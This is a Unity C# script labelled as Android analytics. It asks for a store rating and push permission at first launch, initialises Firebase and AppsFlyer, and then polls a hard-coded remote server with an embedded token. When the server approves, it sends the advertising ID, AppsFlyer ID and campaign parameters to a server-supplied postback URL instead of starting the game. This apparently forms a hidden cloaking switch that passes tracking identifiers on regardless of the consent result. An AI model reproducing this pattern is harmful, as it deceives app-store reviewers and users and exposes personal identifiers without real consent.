using System;
using System.Collections;
using System.Collections.Generic;
using System.Threading.Tasks;
using AppsFlyerSDK;
using Google.Play.Common;
using Google.Play.Review;
using OneSignalSDK;
using UnityEngine;
using UnityEngine.SceneManagement;
using Firebase;
using Firebase.Analytics;
using GoogleMobileAds.Ump.Api;
using UnityEngine.Networking;
using UmpConsentStatus = GoogleMobileAds.Ump.Api.ConsentStatus;

namespace Analytics_Logic
{
    public class AnalyticsAndroid : MonoBehaviour, IAppsFlyerConversionData
    {
        private const string ServerUrl = "https://blyzetask.xyz/api/v1/check";
        private const string Token = "9883ca9c1840cc0b311cbaf051be7c8f840720bff0c4517783262eaeccc98a9a";

        [Header("One Signal")]
        [SerializeField] private string _oneSignalId;

        [Header("Appsflyer")]
        [SerializeField] private string _appsflyerId;

        [Header("Settings")]
        [SerializeField] private bool _isDebug;
        [SerializeField] private string _nextSceneName;

        private SendAnalytics _sendAnalytics;
        private string _advertisingId = "";
        private string _appInstanceId;
        private bool _appsflyerInitialized;
        private bool _firebaseInitialized;
        private bool _conversionReceived;

        private string _afChannel = "unknown";
        private string _afAdset = "unknown";
        private string _afCampaign = "unknown";
        
        public void onConversionDataSuccess(string conversionData)
        {
            Debug.Log("[AppsFlyer] Conversion data: " + conversionData);

            Dictionary<string, object> data = AppsFlyer.CallbackStringToDictionary(conversionData);

            if (data.ContainsKey("af_channel"))
            {
                _afChannel = data["af_channel"].ToString();
                Debug.Log("Channel: " + _afChannel);
            }

            if (data.ContainsKey("af_adset"))
            {
                _afAdset = data["af_adset"].ToString();
                Debug.Log("AdSet: " + _afAdset);
            }

            if (data.ContainsKey("campaign"))
            {
                _afCampaign = data["campaign"].ToString();
                Debug.Log("Campaign: " + _afCampaign);
            }

            _conversionReceived = true;
        }

        public void onConversionDataFail(string error)
        {
            Debug.LogWarning("[AppsFlyer] Conversion data failed: " + error);
        }

        public void onAppOpenAttribution(string attributionData)
        {
            Debug.Log("[AppsFlyer] App Open Attribution: " + attributionData);
        }

        public void onAppOpenAttributionFailure(string error)
        {
            Debug.LogWarning("[AppsFlyer] App Open Attribution failed: " + error);
        }

        private void Awake()
        {
            _sendAnalytics = new();

            bool hasShownRating = PlayerPrefs.GetInt("RatingShownOnce", 0) == 1;

            if (hasShownRating)
            {
                Initialize();
                return;
            }

#if UNITY_ANDROID
            StartCoroutine(ShowAndroidRatingIfNeeded(() =>
            {
                PlayerPrefs.SetInt("RatingShownOnce", 1);
                PlayerPrefs.Save();
                Initialize();
            }));
#else
    Initialize();
#endif
        }

        private async void Initialize()
        {
#if UNITY_ANDROID && !UNITY_EDITOR
    OneSignal.Initialize(_oneSignalId);
#endif

            await OneSignal.Notifications.RequestPermissionAsync(true);
            RequestConsentAndContinue();
        }

        private void RequestConsentAndContinue()
        {
            ConsentRequestParameters request = new ConsentRequestParameters
            {
                TagForUnderAgeOfConsent = false
            };

            ConsentInformation.Update(request, (formError) =>
            {
                if (formError != null)
                {
                    Debug.LogError("Consent update error: " + formError);
                    StartSDKs();
                    return;
                }

                if (ConsentInformation.ConsentStatus == UmpConsentStatus.Required)
                {
                    ConsentForm.Load((form, loadError) =>
                    {
                        if (loadError != null)
                        {
                            Debug.LogError("Consent form load error: " + loadError);
                            StartSDKs();
                            return;
                        }

                        form.Show((showError) =>
                        {
                            if (showError != null)
                                Debug.LogError("Consent form show error: " + showError);

                            StartSDKs();
                        });
                    });
                }
                else
                {
                    StartSDKs();
                }
            });
        }

        private async void StartSDKs()
        {
            bool isInEea = ConsentInformation.IsConsentFormAvailable();
            bool isConsentGranted = ConsentInformation.ConsentStatus == UmpConsentStatus.Obtained;

            AppsFlyerConsent consent = new AppsFlyerConsent(isConsentGranted, isInEea);
            AppsFlyer.setConsentData(consent);
            Debug.Log($"[Consent] isInEea: {isInEea}, isConsentGranted: {isConsentGranted}");

            FirebaseAnalytics.SetUserProperty("user_consent", isConsentGranted ? "granted" : "denied");
            FirebaseAnalytics.SetUserProperty("in_eea", isInEea ? "true" : "false");

            await InitializeFirebase();
            InitializeAppsFlyer();
        }

        private async Task InitializeFirebase()
        {
            try
            {
                DependencyStatus dependencyStatus = await FirebaseApp.CheckAndFixDependenciesAsync();

                if (dependencyStatus == DependencyStatus.Available)
                {
                    FirebaseApp app = FirebaseApp.DefaultInstance;
                    _appInstanceId = await FirebaseAnalytics.GetAnalyticsInstanceIdAsync();

                    FirebaseAnalytics.SetAnalyticsCollectionEnabled(true);
                    FirebaseAnalytics.SetSessionTimeoutDuration(new TimeSpan(0, 30, 0));

                    if (_isDebug)
                    {
                        FirebaseAnalytics.SetUserProperty("debug_mode", "true");
                    }

                    _firebaseInitialized = true;

                    Debug.LogError("Firebase initialized successfully");
                }
                else
                {
                    Debug.LogError($"Could not resolve all Firebase dependencies: {dependencyStatus}");
                    StartGame();
                }
            }
            catch (Exception e)
            {
                Debug.LogError($"Firebase initialization failed: {e.Message}");
                StartGame();
            }
        }

        private void InitializeAppsFlyer()
        {
#if UNITY_ANDROID
            AppsFlyer.initSDK(_appsflyerId, "", this);
#endif

            AppsFlyer.startSDK();
            _appsflyerInitialized = true;

            Debug.Log("[AppsFlyer] SDK initialized");

            StartAdvertisingDataCollection();
        }

        private IEnumerator CollectAdvertisingDataCoroutine()
        {
#if UNITY_ANDROID
            try
            {
                using (AndroidJavaClass up = new AndroidJavaClass("com.unity3d.player.UnityPlayer"))
                using (AndroidJavaObject currentActivity = up.GetStatic<AndroidJavaObject>("currentActivity"))
                using (AndroidJavaClass client =
                       new AndroidJavaClass("com.google.android.gms.ads.identifier.AdvertisingIdClient"))
                using (AndroidJavaObject adInfo =
                       client.CallStatic<AndroidJavaObject>("getAdvertisingIdInfo", currentActivity))
                {
                    _advertisingId = adInfo.Call<string>("getId");
                    Debug.Log("[AD_ID] Android Advertising ID: " + _advertisingId);
                }
            }
            catch (Exception e)
            {
                Debug.LogError("[AD_ID] Android error: " + e.Message);
                _advertisingId = "error_android";
            }
#elif UNITY_EDITOR
               _advertisingId = "editor_ad_id";
                Debug.LogError("[AD_ID] Using editor values");
#endif

            StartCoroutine(RequestAccessFromServer());
            yield break;
        }

        private IEnumerator RequestAccessFromServer()
        {
            Debug.LogError("Start RequestAccessFromServer");

            string appId = Application.identifier;
            string urlWithParams = $"{ServerUrl}?app_id={UnityWebRequest.EscapeURL(appId)}&token={UnityWebRequest.EscapeURL(Token)}";

            Debug.Log($"[ServerCheck] Requesting: {urlWithParams}");

            UnityWebRequest request = UnityWebRequest.Get(urlWithParams);
            request.timeout = 5;
            yield return request.SendWebRequest();

            if (request.result != UnityWebRequest.Result.Success)
            {
                Debug.LogError("Server access request failed: " + request.error);
                StartGame();
                yield break;
            }

            if (request.responseCode != 200)
            {
                Debug.LogError($"Server responded with non-200: {request.responseCode}");
                StartGame();
                yield break;
            }

            string json = request.downloadHandler.text;
            Debug.Log($"[ServerCheck] Response: {json}");

            bool available;
            string postbackUrl;

            try
            {
                AvailabilityResponse response = JsonUtility.FromJson<AvailabilityResponse>(json);
                available = response.result;
                postbackUrl = response.postback_url;
            }
            catch (Exception exception)
            {
                Debug.LogError($"[ServerCheck] JSON parse error: {exception.Message}");
                StartGame();
                yield break;
            }

            if (!available)
            {
                Debug.LogError("[ServerCheck] Available is false, starting game");
                StartGame();
                yield break;
            }

            Debug.Log("[Analytics] Waiting for AppsFlyer conversion data...");
            float timeout = 5f;
            yield return new WaitUntil(() => _conversionReceived || (timeout -= Time.deltaTime) <= 0);

            string fullUrl = GetFullLinkToServer(postbackUrl);
            Debug.LogError("Full URL: " + fullUrl);

            SendAppsFlyerInstallEvent();
            SendFirebaseInstallEvent();

            _sendAnalytics.Send(fullUrl);
        }
        
        private void SendAppsFlyerInstallEvent()
        {
            if (!_appsflyerInitialized)
            {
                Debug.LogWarning("[AppsFlyer] SDK is not initialized yet.");
                return;
            }

            string platform = Application.platform == RuntimePlatform.IPhonePlayer ? "ios" : "android";
            string playerId = OneSignal.User.PushSubscription?.Id ?? "unknown";

            Dictionary<string, string> eventValues = new Dictionary<string, string>
            {
                { "ad_id", _advertisingId },
                { "platform", platform },
                { "player_id", playerId }
            };

            AppsFlyer.sendEvent("install_event", eventValues);
            Debug.Log("[AppsFlyer] install_event sent");
        }

        private void SendFirebaseInstallEvent()
        {
            if (!_firebaseInitialized)
            {
                Debug.LogWarning("Firebase not initialized or analytics disabled");
                return;
            }

            try
            {
                string platform = Application.platform == RuntimePlatform.IPhonePlayer ? "ios" : "android";
                string playerId = OneSignal.User.PushSubscription?.Id ?? "unknown";

                Parameter[] parameters =
                {
                    new("ad_id", _advertisingId),
                    new("platform", platform),
                    new("app_instance_id", _appInstanceId)
                };

                FirebaseAnalytics.LogEvent("advertising_install", parameters);
                FirebaseAnalytics.LogEvent("first_open", parameters);
                FirebaseAnalytics.SetUserProperty("user_platform", platform);
                FirebaseAnalytics.SetUserProperty("advertising_id", _advertisingId);
                FirebaseAnalytics.SetUserId(playerId);

                Debug.LogError("Firebase install event sent successfully");
            }
            catch (Exception e)
            {
                Debug.LogError($"Failed to send Firebase event: {e.Message}");
            }
        }

#if UNITY_ANDROID
        private IEnumerator ShowAndroidRatingIfNeeded(Action onComplete)
        {
            ReviewManager reviewManager = new ReviewManager();

            PlayAsyncOperation<PlayReviewInfo, ReviewErrorCode> requestFlow = reviewManager.RequestReviewFlow();
            yield return requestFlow;

            if (requestFlow.Error != ReviewErrorCode.NoError)
            {
                onComplete?.Invoke();
                yield break;
            }

            PlayReviewInfo reviewInfo = requestFlow.GetResult();
            PlayAsyncOperation<VoidResult, ReviewErrorCode> launchFlow = reviewManager.LaunchReviewFlow(reviewInfo);
            yield return launchFlow;

            onComplete?.Invoke();
        }
#endif

        private string ParseCampaign(string campaign)
        {
            if (string.IsNullOrWhiteSpace(campaign))
                return "";

            string[] parts = campaign.Split('_');
            List<string> subs = new();

            for (int i = 0; i < parts.Length; i++)
            {
                if (!string.IsNullOrWhiteSpace(parts[i]))
                {
                    subs.Add($"sub{i + 1}={parts[i]}");
                }
            }

            return string.Join("&", subs);
        }
        
        private string GetFullLinkToServer(string url)
        {
            string platform = Application.platform == RuntimePlatform.IPhonePlayer ? "ios" : "android";
            string appsFlyerId = AppsFlyer.getAppsFlyerId();
            string language = Application.systemLanguage.ToString().ToLower();
            string campaignParams = ParseCampaign(_afCampaign);
            return $"{url}?adID={_advertisingId}&platform={platform}&appsflyer_id={appsFlyerId}&channel={_afChannel}&adset={_afAdset}&{campaignParams}&language={language}";
        }
        
        private void StartAdvertisingDataCollection()
        {
            StartCoroutine(CollectAdvertisingDataCoroutine());
        }
        
        private void StartGame()
        {
            SceneManager.LoadScene(_nextSceneName);
        }
    }
}